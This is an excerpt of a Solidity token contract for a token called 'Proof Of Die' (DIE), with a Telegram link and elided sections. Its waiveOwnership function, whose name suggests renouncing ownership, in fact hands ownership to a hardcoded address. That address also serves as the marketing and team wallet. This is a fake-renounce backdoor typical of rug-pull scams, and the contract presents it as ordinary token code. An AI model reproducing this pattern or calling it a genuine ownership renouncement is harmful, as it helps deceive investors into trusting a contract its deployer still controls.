...
/**
Telegram : https://t.me/ProofOfDie
*/
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0xb4052e9Db5cf60936EFCE3d7b919f37bFc337B80);
    }
...
contract ProofOfDie is Context, IERC20, Ownable {
    ...
    string private _name = "Proof Of Die";
    string private _symbol = "DIE";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0xb4052e9Db5cf60936EFCE3d7b919f37bFc337B80);
    address payable private teamWalletAddress = payable(0xb4052e9Db5cf60936EFCE3d7b919f37bFc337B80);
